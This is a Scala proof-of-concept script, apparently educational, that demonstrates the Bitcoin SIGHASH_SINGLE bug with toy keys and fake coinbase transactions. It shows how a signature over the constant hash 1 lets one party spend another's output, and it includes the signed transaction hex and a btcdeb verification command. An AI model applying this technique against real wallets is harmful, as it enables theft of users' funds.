// scala 2.13.8

// first we pull in acinq bitcoin-lib for doing the basic bitcoin crypto primitives
// latest version of bitcoin-lib is 0.23, but here we use 0.20 due to weird namespace errors
import $ivy.`fr.acinq::bitcoin-lib:0.20`
import fr.acinq.bitcoin._
import fr.acinq.bitcoin.Crypto._

import scodec.bits._

import scala.language.postfixOps

// Demonstrating the SIGHASH_SINGLE bug which allows stealing funds.
// See https://en.bitcoin.it/wiki/OP_CHECKSIG#Procedure_for_Hashtype_SIGHASH_SINGLE
//     and https://bitcointalk.org/index.php?topic=260595.0

// First we make some people: Alice and Bob
// Their respective private keys are sha256("alice"), and sha256("bob")
object Alice {
  val privateKey = PrivateKey.fromBin(Crypto.sha256(ByteVector("alice".getBytes)))._1
  val publicKey = privateKey.publicKey
}

object Bob {
  val privateKey = PrivateKey.fromBin(Crypto.sha256(ByteVector("bob".getBytes)))._1
  val publicKey = privateKey.publicKey
}

// Now let us create a way to generate a fake coinbase transaction 
// which sends some funds to the supplied redeepScript
def coinbaseTx(amountSats: Long, redeemScript: ByteVector) = Transaction(
            version=0L, 
            txIn = Seq(TxIn.coinbase(OP_1 :: OP_1 :: Nil)), 
            txOut = Seq(TxOut(Satoshi(amountSats),redeemScript)),
            lockTime = 0L
        )

// now Alice and Bob are each given some sats in a coinbase transaction.
val tx1_alice = coinbaseTx(1000000L,Script.write(Script.pay2pkh(Alice.publicKey.hash160)))
val tx1_bob = coinbaseTx(1000000L,Script.write(Script.pay2pkh(Bob.publicKey.hash160)))

// Now Alice creates the "dangerous signature" whereby she signs a "hash" which is
// supposed to be the hash of a bitcoin transaction, but in reality such a transaction
// will never be found. Nevertheless the network will verify her signature, if it is
// used in a certain clever way.
val impossible_txhash = ByteVector32.One.toArray

// We create the signature and append the sighash_single byte
// Notice how this signature is not created by calling any bitcoin-related function
// but instead just invokes the underying raw ecdsa signing function.
val dangerous_sig = Crypto.compact2der(Crypto.sign(impossible_txhash,Alice.privateKey)) :+ SIGHASH_SINGLE.toByte

// Now, by the sighash_single "bug," if Bob is, for whatever reason, furnished
// with Alice's dangerous signature, then he can construct a transaction which
// consumes one of his own outputs and also Alice's output (e.g. a 2-in / 1-out
// consolidating transaction).

val unsigned_consolidating_tx = Transaction(
  version = 1L,
  txIn = Seq(
            // Bob's prevOut must be first
            TxIn(OutPoint(tx1_bob,0), sequence = 1L, signatureScript = ByteVector.empty),
            // Alice's prevOut that Bob is going to steal.
            //         It must be consumed at an input index which is greater than or equal to the
            //         total number of ouptuts. Here the number of outputs is 1, and the index
            //         of Alice's input is 1. This satisfies the constraint.   
            TxIn(OutPoint(tx1_alice,0), sequence = 1L, signatureScript = ByteVector.empty)
          ),
  txOut = Seq(
            TxOut(
              amount = tx1_alice.txOut(0).amount + tx1_bob.txOut(0).amount,
              publicKeyScript = Script.write(Script.pay2wpkh(Bob.publicKey.hash160))
            )
          ),
  lockTime = 0L
)

val signed_consolidating_tx = {
  val bobSig = Transaction.signInput(unsigned_consolidating_tx,0,Script.pay2pkh(Bob.publicKey.hash160),SIGHASH_ALL,Satoshi(1000000L),SigVersion.SIGVERSION_BASE,Bob.privateKey)
  unsigned_consolidating_tx
    .updateSigScript(0,OP_PUSHDATA(bobSig) :: OP_PUSHDATA(Bob.publicKey) :: Nil)
    .updateSigScript(1,OP_PUSHDATA(dangerous_sig) :: OP_PUSHDATA(Alice.publicKey) :: Nil)

}

// If the following line does not throw an error, then Bob has stolen Alice's funds
// by triggering the sighash_single bug (in the acinq bitcoin-lib scala bitconi library)
Transaction.correctlySpends(signed_consolidating_tx, inputs = Seq(tx1_bob, tx1_alice), ScriptFlags.MANDATORY_SCRIPT_VERIFY_FLAGS)

// Print the relevant transactions for use/verification in btcdeb
println(s"alice pub key: ${Alice.publicKey.value.toHex}")
println(s"alice dangerous sig: ${dangerous_sig.toHex}")
println(s"bob pub key: ${Bob.publicKey.value.toHex}")
println(s"signed_tx=$signed_consolidating_tx")
println(s"tx1_alice=$tx1_alice")
println(s"tx1_bob=$tx1_bob")
println("----use below command to verify with btcdeb that Bob can steal Alice's funds by using her dangerous sig!----")
println(s"btcdeb --verbose tx=$signed_consolidating_tx --txin=$tx1_alice")

/**
  * Program output:
  alice pub key: 039997a497d964fc1a62885b05a51166a65a90df00492c8d7cf61d6accf54803be
  alice dangerous sig: 30440220552b93d44c7b3d41967348778c0764db80d69cd5262cb1130256988a647c0224022021ba321be29da7476574125dbfad1365eec798988f7de3310fa69d23b2e6018303
  bob pub key: 024edfcf9dfe6c0b5c83d1ab3f78d1b39a46ebac6798e08e19761f5ed89ec83c10
  signed_tx=01000000022630a640bcade9b6ec4f8b75d614322dc718a4b0a8e4a137de9b1bfe104846100000000069463043021f3d1bd6c512abdc9f1ebced83796f0a8816ba6a48c1c93b570b220839660a8f02201e1df15a1cddf1e3cfaebdee3c26385ac3c059d3ffbad53fc2889adeaa8df9230121024edfcf9dfe6c0b5c83d1ab3f78d1b39a46ebac6798e08e19761f5ed89ec83c10010000006e5bc5bb7280cf072c747f0eb88f27b3f4a28d107bcadf82603c876899fec8d6000000006a4730440220552b93d44c7b3d41967348778c0764db80d69cd5262cb1130256988a647c0224022021ba321be29da7476574125dbfad1365eec798988f7de3310fa69d23b2e601830321039997a497d964fc1a62885b05a51166a65a90df00492c8d7cf61d6accf54803be010000000180841e00000000001600147c8aa0f9f7cf2cf41457213f8089e95b8f96d2d000000000
  tx1_alice=00000000010000000000000000000000000000000000000000000000000000000000000000ffffffff025151ffffffff0140420f00000000001976a91433b94b70bbd434f0ad01925669bedf3469832b5888ac00000000
  tx1_bob=00000000010000000000000000000000000000000000000000000000000000000000000000ffffffff025151ffffffff0140420f00000000001976a9147c8aa0f9f7cf2cf41457213f8089e95b8f96d2d088ac00000000
  ----use below command to verify with btcdeb that Bob can steal Alice's funds by using her dangerous sig!----
  btcdeb --verbose tx=01000000022630a640bcade9b6ec4f8b75d614322dc718a4b0a8e4a137de9b1bfe104846100000000069463043021f3d1bd6c512abdc9f1ebced83796f0a8816ba6a48c1c93b570b220839660a8f02201e1df15a1cddf1e3cfaebdee3c26385ac3c059d3ffbad53fc2889adeaa8df9230121024edfcf9dfe6c0b5c83d1ab3f78d1b39a46ebac6798e08e19761f5ed89ec83c10010000006e5bc5bb7280cf072c747f0eb88f27b3f4a28d107bcadf82603c876899fec8d6000000006a4730440220552b93d44c7b3d41967348778c0764db80d69cd5262cb1130256988a647c0224022021ba321be29da7476574125dbfad1365eec798988f7de3310fa69d23b2e601830321039997a497d964fc1a62885b05a51166a65a90df00492c8d7cf61d6accf54803be010000000180841e00000000001600147c8aa0f9f7cf2cf41457213f8089e95b8f96d2d000000000 --txin=00000000010000000000000000000000000000000000000000000000000000000000000000ffffffff025151ffffffff0140420f00000000001976a91433b94b70bbd434f0ad01925669bedf3469832b5888ac00000000
 */

